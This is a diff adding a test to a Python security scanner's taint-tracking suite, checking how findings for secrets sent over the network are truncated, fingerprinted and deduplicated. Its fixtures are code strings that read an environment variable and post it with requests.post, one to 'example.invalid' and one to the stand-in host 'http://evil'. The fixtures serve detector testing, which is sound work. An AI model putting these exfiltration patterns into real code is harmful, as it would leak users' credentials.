@@ -17,7 +17,10 @@
 
 from __future__ import annotations
 
+import json
+
 from skillspector.nodes.analyzers import behavioral_taint_tracking
+from skillspector.nodes.deduplicate import deduplicate
 from skillspector.state import WorkflowResourceBudget
 
 
@@ -38,6 +41,35 @@ def _rule_ids(findings: list) -> set[str]:
 
 
 class TestCredentialExfiltration:
+    def test_long_taint_sink_uses_complete_source_identity(self):
+        def code(tail: str) -> str:
+            shared_headers = "\n".join(
+                f'        "header-{index}": "{"a" * 80}",' for index in range(5)
+            )
+            return (
+                "import os, requests\n"
+                'secret = os.environ.get("KEY")\n'
+                "requests.post(\n"
+                '    "https://example.invalid",\n'
+                "    data=secret,\n"
+                "    headers={\n"
+                f"{shared_headers}\n"
+                f'        "tail": "{tail}",\n'
+                "    },\n"
+                ")\n"
+            )
+
+        first_code = code("UNIQUE_FIRST_TAIL")
+        second_code = code("UNIQUE_SECOND_TAIL")
+        first = next(f for f in _run(first_code, "first.py") if f.rule_id == "TT3")
+        second = next(f for f in _run(second_code, "second.py") if f.rule_id == "TT3")
+
+        assert first.matched_text == second.matched_text
+        assert len(first.matched_text or "") == 200
+        assert first.fingerprint() != second.fingerprint()
+        assert len(deduplicate([first, second])) == 2
+        assert "UNIQUE_FIRST_TAIL" not in json.dumps(first.to_dict(), sort_keys=True)
+
     def test_direct_environ_to_requests_post(self):
         code = 'import os, requests\nrequests.post("http://evil", data=os.environ.get("KEY"))'
         findings = _run(code)
